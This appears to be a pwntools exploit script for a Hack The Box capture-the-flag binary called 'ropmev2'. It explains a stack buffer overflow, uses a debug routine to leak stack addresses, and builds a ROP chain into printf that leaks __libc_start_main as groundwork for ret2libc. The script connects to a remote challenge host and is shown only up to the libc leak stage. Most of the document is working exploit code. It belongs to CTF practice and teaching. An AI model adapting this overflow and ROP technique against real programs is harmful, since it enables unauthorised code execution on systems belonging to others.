#!/usr/bin/python3
from pwn import *
import binascii

# Sec info
# Arch: amd64 - 64 - little
# RELRO: NoRELRO
# Stack: No canary found
# NX: NX enabled <<< !!!!!
# PIE: No PIE(0x400000)

# ==== Disassembly main() =====
# undefined8 main(void)
# {
#     int
#     result;
#     char buffer[208];
#
#     prep_obf();
#     printf("Please dont hack me\n", buffer);
#     read(0, buffer, 500);
#     result = strcmp("DEBUG\n", buffer);
#     if (result == 0)
#     {
#        printf("I dont know what this is %p\n", buffer);
#        main();
#     }
#     mangle_input(buffer);
#     return 0;
# }

'''
This one is a tricky bugger. We need to do a ROP, but in order to figure out where to ret2libc, we'll need
to leak information. The binary comes with a spiffy %p modifier, which will print the literal rather than address
the pointer is pointing to. Thankfully, we have feedback from the program as to where it's stack frame starts in the
debug routine. Also, there is an input mangler that will try to fuck with what's being input.
'''

''' 
Let's run the program
Please dont hack me
DEBUG
I dont know what this is 0x7ffe332ea460
Please dont hack me
DEBUG
I dont know what this is 0x7ffe332ea380
Please dont hack me

From here we see that the input buffers are 0xE0 (224 bytes apart)

This means we can predict the location of the next buffer, and fill it with the data we need.
So first loop, we'll hit the DEBUG routine. It outputs the start of the first input buffer, which holds DEBUG.

Immediately, it calls main again, with a new buffer starting at [oldbuffer - 0xE0]
Here we can put our payload. Keep in mind that if we let this round of main return, some kind of input mangler is
called to mess things up. We can effectively negate this function, by putting a null byte at buf[0]
buf[1] should then be filled with %x\0, so at one point this can be fed to printf's rdi.

Let's calculate the address where %x\0 will end up. Simple [oldbuffer - (0xE0 + 1)] = [oldbuffer - 0xDF]

'''

''' 
Let's start building our exploit. First some groundwork. This sets everything to overflow the buffer and then
eventuall ROP into printf. Keep in mind that the only gadget that pops the address into rsi, also pops r15. So we
need to stack a dummy.
'''
p = process("./ropmev2")
# p = gdb.debug("./ropmev2")
p = connect("docker.hackthebox.eu", 32039)
elf = ELF("./ropmev2")
gadgets = ROP(elf)

PRINTF = elf.plt['printf']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (gadgets.find_gadget(['pop rdi', 'ret']))[0]
POP_RSI = (gadgets.find_gadget(['pop rsi', 'pop r15', 'ret']))[0]
NULL    = 0x00  # Used to disable the mangler
RBP_MASK = 0xdeadbeef00ded00d
DUMMY = 0xdeadbeeffeedf4ce


log.info("=== Binary info ===")
log.info('plt@printf               :' + hex(PRINTF))
log.info('symbols@__lib_start_main :' + hex(LIBC_START_MAIN))
log.info('pop rdi gadget           :' + hex(POP_RDI))
log.info('pop rsi gadget           :' + hex(POP_RSI))
log.info('rbp mask                 :' + hex(RBP_MASK))
log.info("pop r15 dummy            :" + hex(DUMMY))

'''
Alright ready for business. Let's craft the first stage of our exploit: Getting a pointer to the buffer.
'''

log.info("Stage 1. Retrieve address of buffer.")
payload = Buffer()
payload.add(b"DEBUG")

p.sendlineafter("me", payload.get())
p.recvline()
result = p.recvline()

# Tidying up
addr = result.strip(b"\n")[-14:]  # Grep the chunk we need
addr = int(addr, 16)              # turn into int

log.info("Buffer address        :" + hex(addr))
ADDR_FORMAT_MOD = addr - 0xDF + 264 # The last number is offset to the format modifier
log.info("Address of format mod :" + hex(ADDR_FORMAT_MOD))

'''
We now have all we need to ROP into printf and display the address of __libc_start_main
The size of the buffer is 208 bytes in total, and must be prefixed with \0%x\n\0 (5 bytes)
Let's build our payload
'''
payload = Buffer()
payload.add(b"\0")
payload.add(b"A" * 207)      #  208
payload.add(p64(RBP_MASK))    #  216
payload.add(p64(POP_RDI))     #  224
payload.add(p64(ADDR_FORMAT_MOD))  # 232
payload.add(p64(POP_RSI)) # 240
payload.add(p64(LIBC_START_MAIN)) #248
payload.add(p64(DUMMY)) # 256
payload.add(p64(PRINTF)) # 264
payload.add(b"\0%s\n\0")


log.info("Stage 2: Leak __libc_main_start address")
p.sendlineafter("me", payload.get())
p.recvline()
result = p.recvline()


addr = result.strip(b"\n")  # Grep the chunk we need
addr = u64(addr.ljust(8, b"\x00"))
log.info("Location of __libc_start_main " + hex(addr))

